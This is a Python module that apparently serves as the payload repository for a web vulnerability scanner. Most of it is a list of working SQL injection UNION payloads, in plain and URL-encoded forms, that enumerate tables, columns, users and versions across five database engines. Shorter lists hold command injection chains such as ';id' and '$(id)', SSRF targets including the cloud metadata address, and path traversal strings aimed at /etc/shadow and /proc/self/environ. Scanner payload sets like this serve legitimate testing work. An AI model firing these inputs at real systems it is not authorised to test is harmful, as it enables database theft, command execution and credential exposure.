"""
payloads.py

Central payload repository.

Every plugin imports this module instead of hardcoding payloads.
"""

from dataclasses import dataclass
from typing import Dict, List
import re
from urllib.parse import unquote


@dataclass
class Payload:

    value: str
    description: str = ""


class PayloadRepository:

    def __init__(self):

        self.payloads: Dict[str, List[Payload]] = {

            ##################################################################
            # SQL Injection
            ##################################################################

            "SQLI": [

                Payload("1", "Baseline numeric"),

                # Scalar UNION proof (single column)
                Payload("x' UNION SELECT 1--", "UNION scalar"),
                Payload("x'%20UNION%20SELECT%201;%20%2D%2D", "URL-encoded UNION scalar"),

                # Database version (single column)
                Payload("x' UNION SELECT sqlite_version()--", "SQLite version"),
                Payload("x'%20UNION%20SELECT%20sqlite%5Fversion()%20%2D%2D", "URL-encoded SQLite version"),
                Payload("x' UNION SELECT @@version--", "MySQL/MSSQL @@version"),
                Payload("x'%20UNION%20SELECT%20%40%40version%20%2D%2D", "URL-encoded MySQL/MSSQL @@version"),
                Payload("x' UNION SELECT version()--", "MySQL/PostgreSQL version()"),
                Payload("x'%20UNION%20SELECT%20version()%20%2D%2D", "URL-encoded MySQL/PostgreSQL version()"),
                Payload("x' UNION SELECT banner FROM v$version WHERE ROWNUM=1--", "Oracle version banner"),
                Payload("x'%20UNION%20SELECT%20banner%20FROM%20v%24version%20WHERE%20ROWNUM%3D1%2D%2D", "URL-encoded Oracle version banner"),

                # SQLite enumeration (single column)
                Payload("x' UNION SELECT name FROM sqlite_master--", "SQLite table names"),
                Payload("x'%20UNION%20SELECT%20name%20FROM%20sqlite%5Fmaster%20%2D%2D", "URL-encoded SQLite table names"),
                Payload("x' UNION SELECT sql FROM sqlite_master--", "SQLite DDL"),
                Payload("x'%20UNION%20SELECT%20sql%20FROM%20sqlite%5Fmaster%20%2D%2D", "URL-encoded SQLite DDL"),

                # MySQL/MariaDB enumeration (single column)
                Payload("x' UNION SELECT table_name FROM information_schema.tables--", "MySQL table names"),
                Payload("x'%20UNION%20SELECT%20table_name%20FROM%20information%5Fschema.tables%20%2D%2D", "URL-encoded MySQL table names"),
                Payload("x' UNION SELECT column_name FROM information_schema.columns--", "MySQL column names"),
                Payload("x'%20UNION%20SELECT%20column_name%20FROM%20information%5Fschema.columns%20%2D%2D", "URL-encoded MySQL column names"),
                Payload("x' UNION SELECT schema_name FROM information_schema.schemata--", "MySQL schema names"),
                Payload("x'%20UNION%20SELECT%20schema_name%20FROM%20information%5Fschema.schemata%20%2D%2D", "URL-encoded MySQL schema names"),
                Payload("x' UNION SELECT user()--", "MySQL current user"),
                Payload("x'%20UNION%20SELECT%20user()%20%2D%2D", "URL-encoded MySQL current user"),
                Payload("x' UNION SELECT database()--", "MySQL current database"),
                Payload("x'%20UNION%20SELECT%20database()%20%2D%2D", "URL-encoded MySQL current database"),

                # PostgreSQL enumeration (single column)
                Payload("x' UNION SELECT tablename FROM pg_tables--", "PostgreSQL table names"),
                Payload("x'%20UNION%20SELECT%20tablename%20FROM%20pg%5Ftables%20%2D%2D", "URL-encoded PostgreSQL table names"),
                Payload("x' UNION SELECT table_name FROM information_schema.tables WHERE table_schema='public'--", "PostgreSQL public tables"),
                Payload("x'%20UNION%20SELECT%20table_name%20FROM%20information%5Fschema.tables%20WHERE%20table%5Fschema%3D%27public%27%2D%2D", "URL-encoded PostgreSQL public tables"),
                Payload("x' UNION SELECT current_user--", "PostgreSQL current user"),
                Payload("x'%20UNION%20SELECT%20current%5Fuser%20%2D%2D", "URL-encoded PostgreSQL current user"),
                Payload("x' UNION SELECT current_database()--", "PostgreSQL current database"),
                Payload("x'%20UNION%20SELECT%20current%5Fdatabase()%20%2D%2D", "URL-encoded PostgreSQL current database"),

                # MSSQL enumeration (single column)
                Payload("x' UNION SELECT name FROM sysobjects WHERE xtype='U'--", "MSSQL user tables"),
                Payload("x'%20UNION%20SELECT%20name%20FROM%20sysobjects%20WHERE%20xtype%3D%27U%27%2D%2D", "URL-encoded MSSQL user tables"),
                Payload("x' UNION SELECT name FROM sys.databases--", "MSSQL database names"),
                Payload("x'%20UNION%20SELECT%20name%20FROM%20sys.databases%20%2D%2D", "URL-encoded MSSQL database names"),
                Payload("x' UNION SELECT SYSTEM_USER--", "MSSQL system user"),
                Payload("x'%20UNION%20SELECT%20SYSTEM%5FUSER%20%2D%2D", "URL-encoded MSSQL system user"),

                # Oracle enumeration (single column)
                Payload("x' UNION SELECT table_name FROM user_tables--", "Oracle user tables"),
                Payload("x'%20UNION%20SELECT%20table_name%20FROM%20user%5Ftables%20%2D%2D", "URL-encoded Oracle user tables"),
                Payload("x' UNION SELECT column_name FROM user_tab_columns--", "Oracle column names"),
                Payload("x'%20UNION%20SELECT%20column_name%20FROM%20user%5Ftab%5Fcolumns%20%2D%2D", "URL-encoded Oracle column names"),
                Payload("x' UNION SELECT username FROM all_users--", "Oracle usernames"),
                Payload("x'%20UNION%20SELECT%20username%20FROM%20all%5Fusers%20%2D%2D", "URL-encoded Oracle usernames"),

                # Error / boolean probes
                Payload("'", "Single quote"),
                Payload("x'--", "String terminator"),
                Payload("x'%20%2D%2D", "URL-encoded string terminator"),
                Payload("1' OR '1'='1'--", "String boolean"),
                Payload("x' OR '1'='1'--", "x-prefix boolean"),
                Payload("1%27%20OR%201%3D1%2D%2D", "URL-encoded boolean"),
                Payload("1' ORDER BY 1--", "ORDER BY probe"),

            ],

            ##################################################################
            # Command Injection
            ##################################################################

            "CMDI": [

                Payload("whoami;id", "Allowlist bypass chain"),

                Payload("whoami && id", "Allowlist bypass chain"),

                Payload(";id"),

                Payload(";whoami"),

                Payload("&& id"),

                Payload("| id"),

                Payload("`id`"),

                Payload("$(id)"),

            ],

            ##################################################################
            # SSRF
            ##################################################################

            "SSRF": [

                Payload("http://127.0.0.1"),

                Payload("http://localhost"),

                Payload("http://0.0.0.0"),

                Payload("http://169.254.169.254"),

                Payload("http://example.com"),

            ],

            ##################################################################
            # Path Traversal
            ##################################################################

            "TRAVERSAL": [

                Payload("../../../../etc/passwd"),

                Payload("../../../../etc/shadow"),

                Payload("..\\..\\Windows\\win.ini"),

                Payload("../../../proc/self/environ"),

            ],

            ##################################################################
            # IDOR
            ##################################################################

            "IDOR": [

                Payload("1"),

                Payload("0"),

                Payload("999999"),

                Payload("admin"),

                Payload("administrator"),

            ],

            ##################################################################
            # Information Disclosure
            ##################################################################

            "INFOLEAK": [

                Payload(""),

                Payload("test"),

                Payload("debug"),

                Payload("verbose"),

            ]
        }

    ###########################################################################

    ###########################################################################

    @staticmethod
    def _single_column_union(value: str) -> bool:
        """Reject UNION payloads that select multiple columns."""
        for text in (value, unquote(value)):
            upper = text.upper()
            if "UNION" not in upper or "SELECT" not in upper:
                continue

            match = re.search(
                r"SELECT\s+(.+?)(?:\s+FROM|\s*--|;|$)",
                text,
                re.IGNORECASE | re.DOTALL,
            )
            if not match:
                continue

            select_expr = match.group(1).strip()
            depth = 0
            for ch in select_expr:
                if ch == "(":
                    depth += 1
                elif ch == ")":
                    depth = max(0, depth - 1)
                elif ch == "," and depth == 0:
                    return False

        return True

    def get(self, category):

        items = self.payloads.get(category.upper(), [])
        if category.upper() == "SQLI":
            items = [p for p in items if self._single_column_union(p.value)]
        return items

    ###########################################################################

    def add(self, category, payload):

        category = category.upper()

        self.payloads.setdefault(category, []).append(payload)

    ###########################################################################

    def categories(self):

        return sorted(self.payloads.keys())


payloads = PayloadRepository()